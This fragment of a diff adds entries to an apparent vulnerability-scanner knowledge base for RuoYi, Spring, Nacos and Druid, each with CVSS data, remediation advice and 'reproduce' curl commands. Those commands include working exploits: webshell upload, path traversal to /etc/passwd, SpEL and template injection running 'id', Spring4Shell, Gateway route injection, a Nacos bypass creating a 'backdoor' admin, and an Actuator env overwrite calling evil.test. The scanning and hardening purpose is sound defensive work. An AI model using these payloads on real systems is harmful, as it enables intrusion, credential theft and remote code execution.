+    "fix_detail": "【权限加固】为 /common/upload 添加 @PreAuthorize(\"@ss.hasPermi('common:upload')\") 注解\n【代码修复】CommonController.uploadFile() 添加扩展名白名单校验：\n  String[] allowed = {\"jpg\",\"jpeg\",\"png\",\"gif\",\"bmp\",\"doc\",\"docx\",\"xls\",\"xlsx\",\"ppt\",\"pptx\",\"txt\",\"pdf\"};\n  String ext = fileName.substring(fileName.lastIndexOf(\".\")+1).toLowerCase();\n  if (!Arrays.asList(allowed).contains(ext)) { throw new ServiceException(\"不允许的文件类型\"); }\n【目录加固】上传目录禁止执行权限（nginx: location /profile/ { location ~ \\.(jsp|jspx)$ { deny all; } }）\n【配置加固】application.yml 限制上传大小：spring.servlet.multipart.max-file-size: 10MB\n【WAF 规则】拦截 Content-Type 含 multipart/form-data 且无 Cookie 的 /common/upload 请求\n【合规】OWASP A04:2021 不安全设计；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 上传无害 .txt 探针文件验证接口可写：\ncurl -X POST \"http://target/common/upload\" \\\n  -F \"file=@/tmp/probe.txt;type=text/plain\"\n\n# 预期响应：HTTP 200 + JSON 含 {\"url\": \"/profile/upload/...\", \"fileName\": \"probe.txt\"} 字段\n\n# 实战利用（上传 webshell.jsp，需登录后台）：\ncurl -X POST \"http://target/common/upload\" \\\n  -H \"Cookie: JSESSIONID=<已登录的 session>\" \\\n  -F \"file=@webshell.jsp;type=application/octet-stream\"\n  # 访问返回的 url 即可获得 webshell",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+    "cvss_score": 9.1,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A04:2021"
+    },
+    "affected_versions": ">=4.0,<4.7",
+    "variant": "",
+    "module": "plugins.ruoyi.file_upload"
+  },
+  "定时任务 RCE（未授权访问）": {
+    "name": "定时任务 RCE（未授权访问）",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "若依 /monitor/job/edit 接口未授权可访问：攻击者可编辑 invokeTarget 触发 RCE。本插件仅验证编辑接口未鉴权，不实际修改任务或触发执行（agents.md §7 安全合规）",
+    "fix": "强制 /monitor/job/** 鉴权；白名单校验 invokeTarget 调用目标，禁止 ruoYiConfig 等敏感方法；后台路径接入统一鉴权框架",
+    "fix_detail": "【权限加固】为 /monitor/job/** 路径添加 @PreAuthorize(\"@ss.hasPermi('monitor:job:list')\")\n【代码修复】SysJobController.edit() 添加 invokeTarget 白名单校验：\n  String[] blacklist = {\"ruoYiConfig\",\"java.lang.Runtime\",\"java.lang.ProcessBuilder\"};\n  for (String s : blacklist) { if (invokeTarget.contains(s)) throw new ServiceException(\"非法调用目标\"); }\n【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验）\n【配置加固】quartz.properties 限制 JobDataMap 可序列化类：org.quartz.jobStore.allowNonManagedTxInJDBC=false\n【WAF 规则】拦截 /monitor/job/edit 的 POST 请求含 invokeTarget 参数\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验",
+    "reproduce": "# 探测 /monitor/job/edit 是否未授权可访问（不修改任何任务）：\ncurl -X POST \"http://target/monitor/job/edit\" \\\n  -d \"jobId=99999&jobName=test&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile&cronExpression=0/10+*+*+*+*+?\"\n\n# 预期响应（未授权可访问）：响应体含 \"任务不存在\" 类业务错误（而非登录页/401）\n\n# 实战利用（需 /monitor/job/edit 未鉴权，慎用，仅授权测试）：\ncurl -X POST \"http://target/monitor/job/edit\" \\\n  -d \"jobId=1&jobName=test&invokeTarget=org.springframework.cglib.core.ReflectUtils.invokeFn('new java.lang.ProcessBuilder(new String[]{'id'}).start()'\n  # 该 PoC 会触发 RCE，仅在授权靶场验证",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": ">=4.0,<4.7",
+    "variant": "",
+    "module": "plugins.ruoyi.job_rce"
+  },
+  "Thymeleaf/SpEL 模板注入": {
+    "name": "Thymeleaf/SpEL 模板注入",
+    "cve": "CVE-2023-38286",
+    "severity": "high",
+    "category": "vuln",
+    "description": "Thymeleaf 视图名注入：当 URL 路径被作为视图名传给 Thymeleaf 解析时，__${7*7}__::.x 会被求值为 49。本插件仅用算术表达式探针验证，不执行命令",
+    "fix": "禁止将用户可控路径直接作为视图名；使用 @Controller + @ResponseBody 显式标注；升级 Spring/Thymeleaf 修复 CVE-2023-38286 等已知漏洞；URL 白名单路由",
+    "fix_detail": "【升级方案】升级 Thymeleaf 至 3.1.2.RELEASE+（修复 CVE-2023-38286）\n  pom.xml: <thymeleaf.version>3.1.2.RELEASE</thymeleaf.version>\n【代码修复】所有 Controller 方法用 @ResponseBody 或 @RestController 显式标注，避免返回视图名：\n  @RestController  // 整个类都返回 JSON，不走视图解析\n  public class ApiController { ... }\n【代码修复】禁止 Controller 返回用户可控路径：\n  - 错误：return \"redirect:\" + userInput;\n  - 正确：return \"redirect:/fixed/path\";\n【配置加固】Spring Security 添加 URL 白名单：\n  .anyRequest().authenticated()  // 默认拒绝未匹配请求\n【WAF 规则】拦截 URL 路径含 __${ 或 __*{ 的请求（Thymeleaf 表达式特征）\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验",
+    "reproduce": "# 1. 探针：发送 __${7*7}__::.x 作为路径，检查响应是否含 49：\ncurl -i \"http://target/__${7*7}__::.x\"\n\n# 2. 使用 URL 编码绕过部分过滤：\ncurl -i \"http://target/__%24%7B7*7%7D__::.x\"\n\n# 预期响应：HTTP 500/404 错误页面或响应体含 \"49\" 字样（表达式已求值）\n\n# 3. 进阶利用（仅授权测试，执行 id 命令）：\ncurl -i \"http://target/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x\"\n  # 响应会执行 id 命令，需结合响应时间或 OOB 验证",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 8.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.thymeleaf_ssti"
+  },
+  "任意文件读取（路径穿越）": {
+    "name": "任意文件读取（路径穿越）",
+    "cve": "CNVD-2021-01931",
+    "severity": "high",
+    "category": "vuln",
+    "description": "若依 /common/download/resource?resource= 接口未对 resource 参数做白名单校验，攻击者构造 ../ 路径穿越可读取任意文件",
+    "fix": "resource 参数白名单校验（仅允许 /profile/upload/ 下的文件）；禁止 .. 路径穿越；升级到若依 4.7+ 已修复该漏洞",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n【代码修复】CommonController.downloadResource() 添加路径校验：\n  if (!resource.startsWith(\"/profile/upload/\")) { throw new ServiceException(\"非法 resource 路径\"); }\n  if (resource.contains(\"..\")) { throw new ServiceException(\"禁止路径穿越\"); }\n【权限加固】为 /common/download/resource 添加 @PreAuthorize(\"@ss.hasPermi('monitor:download')\")\n【WAF 规则】拦截 resource 参数含 \"..\" 或不以 \"/profile/upload/\" 开头的请求\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 读取 /etc/passwd（Linux）：\ncurl \"http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd\"\n\n# 读取 application.yml（若依配置文件，含数据库密码）：\ncurl \"http://target/common/download/resource?resource=/profile/../../../../../../../app/application.yml\"\n\n# 预期响应：响应体含 \"root:x:0:0:\" 格式行（/etc/passwd 特征）或 \"spring.datasource\" 字样",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": ">=4.0,<4.7",
+    "variant": "",
+    "module": "plugins.ruoyi.file_read_path"
+  },
+  "未授权访问（批量）": {
+    "name": "未授权访问（批量）",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "批量探测若依/Spring 常见未授权端点：Actuator env、Druid 监控、Swagger UI、后台用户列表。任一端点未授权暴露即存在信息泄露风险",
+    "fix": "生产环境关闭 Actuator 或加鉴权；Druid 监控路径限制 IP 白名单并修改默认口令；Swagger 仅在测试环境启用；后台接口接入统一鉴权框架",
+    "fix_detail": "【Actuator 加固】application.yml 仅暴露必要端点：\n  management.endpoints.web.exposure.include: health,info\n  management.endpoint.env.enabled: false  # 禁用 env 端点\n【Actuator 鉴权】SecurityConfig.configure(): .antMatchers(\"/actuator/**\").hasRole(\"ADMIN\")\n【Druid 加固】修改默认口令 + IP 白名单：\n  spring.datasource.druid.stat-view-servlet.login-username: <强口令>\n  spring.datasource.druid.stat-view-servlet.allow: 127.0.0.1\n【Swagger 加固】生产环境禁用：swagger.enabled: false\n【后台鉴权】/system/user/list 等接口添加 @PreAuthorize(\"@ss.hasPermi('system:user:list')\")\n【WAF 规则】拦截外网对 /actuator, /druid, /swagger, /system/user/* 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. Actuator env 泄露（含数据库密码、Redis 密码等）：\ncurl \"http://target/actuator/env\" | python -m json.tool | head -50\n\n# 2. Actuator heapdump 下载内存快照（可提取密码）：\ncurl \"http://target/actuator/heapdump\" -o heapdump.bin\n  # 使用 Eclipse MAT 或 jhat 分析 heapdump.bin，搜索 \"password\" 关键字\n\n# 3. Druid 监控未授权访问：\ncurl -i \"http://target/druid/index.html\"\n\n# 4. 后台用户列表未授权（敏感接口）：\ncurl \"http://target/system/user/list\" | python -m json.tool\n  # 返回 JSON 含用户名、手机号、邮箱等敏感信息即未授权",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.unauth_batch"
+  },
+  "Nacos 未授权访问": {
+    "name": "Nacos 未授权访问",
+    "cve": "CVE-2021-29441",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "若依集成 Nacos 配置中心，/nacos/v1/auth/users 未授权可获取用户列表，导致配置中心账号泄露，可进一步接管服务配置",
+    "fix": "开启 Nacos 身份认证（nacos.core.auth.enabled=true）；修改默认密钥；/nacos/** 路径强制鉴权；生产环境限制 Nacos 端口仅内网访问",
+    "fix_detail": "【升级方案】升级 Nacos 至 1.4.2+（修复 CVE-2021-29441 默认 token 绕过鉴权）\n【配置加固】application.properties 启用鉴权并修改默认 token：\n  nacos.core.auth.enabled=true\n  nacos.core.auth.plugin.nacos.token.secret.key=<自定义 Base64 密钥，至少 32 字节>\n【口令修改】修改 Nacos 控制台默认口令（nacos/nacos）：\n  curl -X PUT \"http://nacos:8848/nacos/v1/auth/users\" -d \"username=nacos&newPassword=<强口令>\"\n【网络隔离】Nacos 端口 8848 仅允许内网访问：\n  iptables -A INPUT -p tcp --dport 8848 ! -s 192.168.0.0/16 -j DROP\n【WAF 规则】拦截外网对 /nacos/v1/auth/users, /nacos/v1/cs/configs 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 身份鉴别",
+    "reproduce": "# 1. 探测 Nacos 是否未授权可访问用户列表：\ncurl \"http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10\"\n  # 返回 JSON 含 \"username\" + \"password\" 字段即未授权\n\n# 2. 使用默认 serverIdentity 绕过鉴权（CVE-2021-29441）：\ncurl -H \"serverIdentity: identity\" \\\n  \"http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10\"\n\n# 3. 读取全部配置（含数据库密码、JWT 密钥等敏感信息）：\ncurl \"http://target:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99\" \\\n  -H \"serverIdentity: identity\"\n\n# 4. 添加管理员用户持久化权限（仅授权测试）：\ncurl -X POST \"http://target:8848/nacos/v1/auth/users\" \\\n  -H \"serverIdentity: identity\" \\\n  -d \"username=backdoor&password=Backdoor@123\"",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.nacos_unauth"
+  },
+  "Druid 弱口令爆破": {
+    "name": "Druid 弱口令爆破",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "brute",
+    "description": "对 /druid/submitLogin 用 6 个默认用户名 + password.txt 字典爆破，命中 success 即成功",
+    "fix": "修改 Druid 监控默认口令，限制访问来源 IP，关闭未授权的 /druid 路径",
+    "fix_detail": "【配置修改】application.yml 修改 Druid 监控账号密码：\n  spring.datasource.druid.stat-view-servlet.login-username: <强口令>\n  spring.datasource.druid.stat-view-servlet.login-password: <强口令>\n【IP 白名单】限制访问来源：\n  spring.datasource.druid.stat-view-servlet.allow: 127.0.0.1,192.168.0.0/16\n  spring.datasource.druid.stat-view-servlet.deny: 空\n【禁用监控】生产环境可关闭 Druid 监控：\n  spring.datasource.druid.stat-view-servlet.enabled: false\n【WAF 规则】拦截外网对 /druid/* 路径的访问\n【合规】等保 2.0 8.1.4 要求：身份鉴别信息复杂度",
+    "reproduce": "# 探测 Druid 监控是否可访问：\ncurl \"http://target/druid/\" -i\n  # 返回 302 跳转到 /druid/login.html 即存在 Druid 监控\n\n# 尝试默认口令登录（admin/admin、admin/123456 等）：\ncurl -X POST \"http://target/druid/submitLogin\" \\\n  -d \"loginUsername=admin&loginPassword=admin\"\n\n# 预期响应（成功）：响应体含 \"success\" 字样\n\n# 登录成功后可查看 SQL 监控、会话信息、连接池状态等敏感信息：\ncurl \"http://target/druid/sql.html\" -b \"JSESSIONID=<已登录的 session>\"",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cvss_score": 9.1,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A07:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.druid_brute"
+  },
+  "后台默认口令（admin/admin123）": {
+    "name": "后台默认口令（admin/admin123）",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "brute",
+    "description": "若依后台默认口令 admin/admin123：POST /login 不带验证码尝试登录，响应含 token 或 code:200 即默认口令未修改。验证码场景会显式标记 UNKNOWN",
+    "fix": "强制修改 admin 默认口令为高强度密码；启用登录验证码；限制 admin 仅内网访问；登录失败次数阈值锁定；定期审计用户列表",
+    "fix_detail": "【口令修改】首次部署后立即执行：登录后台 → 个人中心 → 修改密码（≥12 位，含大小写+数字+符号）\n【SQL 修改】update sys_user set password = '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2' where user_name = 'admin';\n  （示例为 admin123 的 BCrypt 哈希，替换为目标强口令的哈希）\n【启用验证码】application.yml: shiro.captchaEnabled: true\n【失败锁定】SysLoginController.login() 添加：if (loginRecordService.isLocked(username)) throw new ServiceException(\"账号已锁定\")\n【WAF 规则】拦截 username=admin 且 password=admin123 的 /login 请求\n【合规】等保 2.0 8.1.4 要求：身份鉴别信息复杂度并定期更换",
+    "reproduce": "# 尝试默认口令登录（admin/admin123）：\ncurl -X POST \"http://target/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"admin123\"}'\n\n# 预期响应：HTTP 200 + JSON 含 {\"code\":200,\"msg\":\"操作成功\",\"token\":\"...\"} 字段\n\n# 验证登录成功后访问后台接口：\ncurl \"http://target/getInfo\" -H \"Authorization: Bearer <token>\"\n  # 返回用户信息即确认默认口令有效",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A07:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.default_password"
+  },
+  "RuoYi-Cloud Nacos 配置泄露": {
+    "name": "RuoYi-Cloud Nacos 配置泄露",
+    "cve": "CVE-2021-29441",
+    "severity": "high",
+    "category": "vuln",
+    "description": "RuoYi-Cloud 微服务版使用 Nacos 作为配置中心，若 Nacos 未授权访问可泄露数据库密码、Redis 密码等敏感配置",
+    "fix": "为 Nacos 控制台添加认证，修改默认密码，限制外网访问 Nacos 端口",
+    "fix_detail": "【升级方案】升级 Nacos 至 1.4.2+（修复 CVE-2021-29441 默认 token 绕过鉴权）\n【配置加固】application.properties 修改默认鉴权 token：\n  nacos.core.auth.plugin.nacos.token.secret.key=<自定义 Base64 密钥>\n  nacos.core.auth.enabled=true  # 启用鉴权\n【口令修改】首次部署后立即修改 Nacos 控制台默认口令（nacos/nacos）：\n  控制台 → 权限控制 → 用户管理 → 修改密码（≥12 位）\n【网络隔离】Nacos 端口（8848）仅允许内网访问，禁止暴露到公网：\n  iptables -A INPUT -p tcp --dport 8848 -s 192.168.0.0/16 -j ACCEPT\n  iptables -A INPUT -p tcp --dport 8848 -j DROP\n【WAF 规则】拦截外网对 /nacos/v1/cs/configs, /nacos/v1/auth/users 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 身份鉴别",
+    "reproduce": "# 1. 探测 Nacos 是否可未授权访问（CVE-2021-29441 默认 token 绕过）：\ncurl \"http://target:8848/nacos/v1/cs/configs?dataId=&group=&pageSize=1\"\n  # 返回 JSON 含 \"pageItems\" 或 \"configs\" 即未授权可访问\n\n# 2. 使用默认 token 绕过鉴权（CVE-2021-29441）：\ncurl -H \"serverIdentity: identity\" \"http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10\"\n  # 返回用户列表即存在默认 token 绕过漏洞\n\n# 3. 读取所有配置（含数据库密码、Redis 密码、JWT 密钥等）：\ncurl \"http://target:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99\" \\\n  -H \"serverIdentity: identity\"\n\n# 4. 读取特定配置内容（如 ruoyi-system-dev.yaml）：\ncurl \"http://target:8848/nacos/v1/cs/configs?dataId=ruoyi-system-dev.yaml&group=DEFAULT_GROUP\" \\\n  -H \"serverIdentity: identity\"",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cvss_score": 9.1,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.ruoyi_cloud_nacos"
+  },
+  "RuoYi Swagger 未授权访问": {
+    "name": "RuoYi Swagger 未授权访问",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "RuoYi 的 Swagger/Knife4j API 文档可被未授权访问，暴露全部 API 接口及参数",
+    "fix": "在 SecurityConfig 中为 Swagger 相关路径添加认证拦截，或在生产环境禁用 Swagger",
+    "fix_detail": "【代码修复】SecurityConfig.configure() 添加 Swagger 路径鉴权：\n  .antMatchers(\"/swagger-ui.html\", \"/swagger-resources/**\", \"/webjars/**\",\n               \"/v2/api-docs\", \"/doc.html\", \"/swagger-ui/**\").authenticated()\n【生产禁用】application.yml 关闭 Swagger：\n  swagger.enabled: false\n  knife4j.production: true  # Knife4j 生产模式\n【Profile 隔离】仅在 dev profile 启用 Swagger：\n  @Profile({\"dev\",\"test\"}) @EnableSwagger2\n【WAF 规则】拦截外网对 /swagger-ui.html, /v2/api-docs, /doc.html 路径的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 探测 Swagger UI 是否可访问：\ncurl -i \"http://target/swagger-ui.html\"\n  # 返回 200 + 含 \"Swagger UI\" 字样即未授权可访问\n\n# 探测 Knife4j 文档（若依常用）：\ncurl -i \"http://target/doc.html\"\n\n# 拉取 OpenAPI JSON（包含全部 API 接口定义）：\ncurl \"http://target/v2/api-docs\" | python -m json.tool | head -50\n  # 返回的 JSON 含所有接口路径、参数定义、响应模型",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.ruoyi_swagger_unauth"
+  },
+  "RuoYi 代码生成模块 SSTI": {
+    "name": "RuoYi 代码生成模块 SSTI",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "RuoYi 代码生成模块中的模板引擎可能存在 SSTI 漏洞，攻击者可通过模板注入实现 RCE",
+    "fix": "升级 RuoYi 至最新版本，对模板变量进行严格过滤",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.7.2+（代码生成模块模板变量过滤加强）\n【代码修复】GenController.edit() 对 tableName、comments 等参数做白名单校验：\n  String pattern = \"^[a-zA-Z0-9_]+$\";\n  if (!tableName.matches(pattern)) throw new ServiceException(\"非法表名\");\n【权限加固】为 /tool/gen/** 路径强制鉴权：@PreAuthorize(\"@ss.hasPermi('tool:gen:edit')\")\n【生产禁用】生产环境关闭代码生成功能：application.yml: ruoyi.gen.enabled: false\n【WAF 规则】拦截 /tool/gen/edit 的 POST 请求含 ${ 或 #{ 的参数\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验",
+    "reproduce": "# 1. 探测代码生成模块是否可访问：\ncurl -i \"http://target/tool/gen/\"\n  # 返回 200 或 302 跳转登录页即模块存在\n\n# 2. 探针：通过 tableName 参数注入 Velocity/Thymeleaf 表达式：\ncurl -X POST \"http://target/tool/gen/edit\" \\\n  -H \"Cookie: JSESSIONID=<已登录的 session>\" \\\n  -d \"tableId=1&tableName=sys_user_${7*7}&comments=test\"\n\n# 3. 触发代码生成（预览功能会执行模板）：\ncurl \"http://target/tool/gen/preview/1\" -H \"Cookie: JSESSIONID=<已登录的 session>\"\n  # 预期响应：生成的代码中含 \"49\" 字样（表达式已求值）\n\n# 4. 进阶利用（仅授权测试，执行命令）：\ncurl -X POST \"http://target/tool/gen/edit\" \\\n  -d \"tableId=1&tableName=sys_user_${Runtime.getRuntime().exec('id')}&comments=test\"",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 8.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.ruoyi_gen_rce"
+  },
+  "CVE-2022-22965 Spring4Shell 远程代码执行": {
+    "name": "CVE-2022-22965 Spring4Shell 远程代码执行",
+    "cve": "CVE-2022-22965",
+    "severity": "high",
+    "category": "vuln",
+    "description": "JDK9+ 下 DataBinder 可访问 ClassLoader，写 Tomcat 日志 getshell（影响 5.3.x）",
+    "fix": "升级 Spring Framework 至 5.3.18+ / 5.2.20+；或升级 JDK 至不受影响版本",
+    "fix_detail": "【升级方案】Spring Framework 5.3.x 升级至 5.3.18+，5.2.x 升级至 5.2.20+；\n  或降级 JDK 至 8（JDK8 不受 ClassLoader 暴露影响，仅为缓解措施）\n【代码修复】为 Controller 增加 @InitBinder 全局黑名单，禁止绑定 class 属性：\n  @ControllerAdvice\n  public class SafeBinder {\n      @InitBinder\n      public void setDisallowedFields(WebDataBinder binder) {\n          binder.setDisallowedFields(\"class.*\", \"Class.*\", \"*.class.*\", \"*.Class.*\");\n      }\n  }\n【配置加固】Tomcat 改用 Embedded 部署（非 war），关闭 AccessLogValve 文件写入；\n  生产环境禁用 spring-webmvc 对 class.module 链路的参数绑定\n【WAF 规则】拦截请求参数中含 class.module.classLoader / class.classLoader 的请求\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 Spring MVC 接口可达性：\ncurl -i \"http://target/\"\n  # 返回 200 即 Spring MVC 接口可达\n\n# 2. 发送 Spring4Shell 探针（写 Tomcat AccessLog 为 JSP）：\ncurl -X POST \"http://target/\" \\\n  -d \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}c2s65 SPRING4SHELL_PROBE\" \\\n  -d \"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\" \\\n  -d \"class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\"\n\n# 3. 访问写入的 JSP Webshell 验证 RCE：\ncurl \"http://target/tomcatwar.jsp\"\n\n# 预期响应：POST 返回 200 且无 Bad Request/error 标识，访问 JSP 返回 200 即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.spring4shell"
+  },
+  "CVE-2022-22947 Spring Cloud Gateway 远程代码执行": {
+    "name": "CVE-2022-22947 Spring Cloud Gateway 远程代码执行",
+    "cve": "CVE-2022-22947",
+    "severity": "high",
+    "category": "vuln",
+    "description": "Actuator /gateway/routes/ 端点可匿名创建路由，SPEL Filter 求值触发 RCE",
+    "fix": "升级 Spring Cloud Gateway 至 3.1.1+ / 3.0.7+；为 Actuator 端点配置认证",
+    "fix_detail": "【升级方案】pom.xml 升级 Spring Cloud Gateway：\n  3.1.x -> 3.1.1+\n  3.0.x -> 3.0.7+\n【配置加固】application.yml 收敛 Actuator 端点暴露：\n  management.endpoints.web.exposure.include: health,info\n  management.endpoints.web.exposure.exclude: gateway  # 禁用 gateway 端点\n【SecurityConfig】为 gateway 端点配置角色：\n  .antMatchers(\"/actuator/gateway/**\").hasRole(\"ADMIN\")\n【代码修复】禁止 SPEL 在 Filter args 中求值，改用字面量配置\n【WAF 规则】拦截外网对 /actuator/gateway/routes/ 的 POST 创建请求\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 Gateway Actuator 端点：\ncurl -i \"http://target/actuator/gateway/routes\"\n\n# 2. 创建含恶意 SPEL Filter 的路由（CVE-2022-22947）：\ncurl -X POST \"http://target/actuator/gateway/routes/test\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"id\":\"test\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"X-Test\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec(\\\"id\\\")}\"}}],\"uri\":\"http://localhost:1\",\"order\":0}'\n\n# 3. 刷新路由配置使 SPEL 生效：\ncurl -X POST \"http://target/actuator/gateway/refresh\"\n\n# 4. 触发路由访问执行 SPEL：\ncurl \"http://target/test\"\n\n# 5. 清理测试路由：\ncurl -X DELETE \"http://target/actuator/gateway/routes/test\"\n\n# 预期响应：POST 返回 201 Created 即路由可创建，漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.gateway_rce"
+  },
+  "Spring Boot Actuator env 配置覆盖 RCE": {
+    "name": "Spring Boot Actuator env 配置覆盖 RCE",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "/actuator/env POST 可写配置属性，eureka xstream 反序列化触发 RCE（影响 Spring Cloud）",
+    "fix": "升级 Spring Cloud 至安全版本；为 /actuator/env 配置 POST 认证与 CSRF",
+    "fix_detail": "【升级方案】pom.xml 升级 Spring Cloud 至安全版本：\n  Spring Cloud Hoxton SR9+ / 2020.0.x+\n  移除 eureka-client 中的 xstream 反序列化漏洞\n【配置加固】application.yml 禁用 env POST 写入与 refresh：\n  management.endpoint.env.post.enabled: false  # 禁用 POST\n  management.endpoints.web.exposure.exclude: env,refresh\n【SecurityConfig】为 env POST 与 refresh 配置认证与 CSRF：\n  .antMatchers(HttpMethod.POST, \"/actuator/env\", \"/actuator/refresh\").hasRole(\"ADMIN\")\n【代码修复】自定义 EnvironmentMvcEndpoint 拦截 eureka.client.serviceUrl 写入\n【WAF 规则】拦截外网对 /actuator/env 的 POST 与 /actuator/refresh 调用\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 env 端点 GET 是否可读：\ncurl -i \"http://target/actuator/env\"\n\n# 2. POST 写入恶意 eureka 服务地址（配置覆盖）：\ncurl -X POST \"http://target/actuator/env\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://evil.test/xstream\"}'\n\n# 3. 触发 refresh 使配置生效：\ncurl -X POST \"http://target/actuator/refresh\"\n\n# 4. evil.test 返回恶意 XML 触发 xstream 反序列化 RCE（PoC，请勿对未授权目标使用）：\n# 服务端 evil.test 需返回构造的 xstream payload 触发 EurekaClient 反序列化\n\n# 预期响应：POST /actuator/env 返回 200/201（非 401/403/405）即 env 可写入，漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.actuator_env_rce"
+  },
+  "Spring Boot Actuator Jolokia 远程代码执行": {
